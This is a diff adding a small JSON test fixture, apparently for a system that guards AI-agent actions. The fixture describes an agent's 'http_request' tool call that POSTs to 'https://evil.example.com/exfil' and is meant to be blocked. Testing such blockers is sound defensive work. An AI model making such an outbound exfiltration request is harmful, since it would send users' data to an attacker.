@@ -1,0 +1,14 @@
+{
+  "actionId": "fixture-block-outbound-001",
+  "sessionId": "session-fixture-01",
+  "timestamp": "2026-04-01T00:00:00.000Z",
+  "framework": "generic",
+  "actionType": "outbound_request",
+  "operation": "post",
+  "toolName": "http_request",
+  "arguments": {
+    "url": "https://evil.example.com/exfil",
+    "method": "POST"
+  }
+}
+
